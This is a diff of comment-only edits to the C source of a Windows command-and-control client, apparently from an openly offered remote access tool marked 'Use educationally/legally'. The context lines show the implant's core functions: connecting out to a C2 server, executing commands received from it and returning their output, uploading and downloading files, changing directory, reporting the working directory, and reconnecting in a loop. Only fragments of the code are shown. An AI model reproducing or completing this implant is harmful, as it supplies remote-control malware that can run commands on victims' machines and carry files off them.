@@ -17,7 +17,7 @@ Use educationally/legally.
 // Function to create connect socket.
 const SOCKET create_socket() 
 {
-	// Initialize winsock.
+	// Initialize winsock
 	WSADATA wsData;
 	WORD ver = MAKEWORD(2, 2);
 
@@ -60,6 +60,7 @@ int send_pipe_output(HANDLE child_stdout_read, char* const buf, const SOCKET con
 		// Read stdout, stderr bytes from pipe.
 		ReadFile(child_stdout_read, buf, BUFLEN, &bytes_read, NULL);
 
+		// Serialize chunk size bytes (for endianness).
 		uint32_t chunk_size_nbytes = htonl((uint32_t)bytes_read); 
 
 		// Send serialized chunk size int32 bytes to server.
@@ -99,16 +100,21 @@ int exec_cmd(const SOCKET connect_socket, char* const buf)
 	|| (!sakito_win_cp(child_stdout_write, buf)))
 		return FAILURE;
 
+	// Send read bytes from pipe (stdout, stderr) to the c2 server.
 	return send_pipe_output(child_stdout_read, buf, connect_socket);
 }
 
+// Client change directory function.
 int ch_dir(char* const dir, const SOCKET connect_socket) 
 {
+	// '1' = success.
 	char chdir_result[] = "1";
 	_chdir(dir);
 
+	// If an error occurs.
 	if (errno == ENOENT) 
 	{
+		// '0' = failure.
 		chdir_result[0] = '0';
 		errno = 0;
 	}
@@ -141,6 +147,7 @@ int send_file(const SOCKET connect_socket, char* const buf)
 	if (recv(connect_socket, buf, 1, 0) < 1)
 		return SOCKET_ERROR;
 
+	// Close the file.
 	CloseHandle(h_file);
 
 	return SUCCESS;
@@ -149,6 +156,7 @@ int send_file(const SOCKET connect_socket, char* const buf)
 // Function to receive file from client (TCP file transfer).
 int recv_file(const SOCKET connect_socket, char* const buf) 
 {
+	// Open file.
 	HANDLE h_file = sakito_win_openf(buf+1, GENERIC_WRITE, CREATE_ALWAYS);
 
 	// Send file transfer start byte.
@@ -181,7 +189,7 @@ int send_cwd(char* const buf, const SOCKET connect_socket)
 	// Store working directory in buf.
 	GetCurrentDirectory(BUFLEN, buf);
 
-	// Send buf bytes containing current working directory to server.
+	// Send current working directory to c2 server.
 	if (send(connect_socket, buf, strlen(buf)+1, 0) < 1)
 		return SOCKET_ERROR;
 
@@ -197,7 +205,7 @@ int main(void)
 		const SOCKET connect_socket = create_socket();
 
 		/* 
-		If connected to c2 recursively loop to receive/parse c2 commands. If an error-
+		If connected to c2 recursively loop to receive/parse c2 command codes. If an error-
 		occurs (connection lost, etc) break the loop and reconnect & restart loop. The switch-
 		statement will parse & execute functions based on the order of probability.
 		*/
